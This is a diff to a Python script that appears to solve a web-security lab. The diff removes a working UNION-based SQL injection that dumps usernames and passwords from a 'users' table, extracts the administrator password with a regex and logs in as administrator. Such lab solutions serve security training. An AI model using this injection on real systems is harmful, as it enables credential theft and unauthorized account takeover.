@@ -29,22 +29,7 @@ def main(args):
     text_columns = utils.determine_text_columns(
         shop.category_url, shop.no_proxy, num_columns
     )
-    nulls = ["NULL"] * num_columns
-    nulls[text_columns[0]] = "username||':'||password"
-    exploit = ",".join(nulls)
-    category = f"' UNION SELECT {exploit} FROM users-- "
-    exploit_url = shop.category_url + category
-    if args.no_proxy:
-        resp = requests.get(exploit_url)
-    else:
-        resp = requests.get(exploit_url, proxies=utils.PROXIES, verify=False)
-    log.info("Getting admin password")
-    pattern = re.compile(">administrator:(.*?)<")
-    m = pattern.search(resp.text)
-    password = m[1]
-    log.info(f"Administrator password: {password}")
-    shop.login("administrator", password)
-    shop.is_solved()
+    
     
     
     
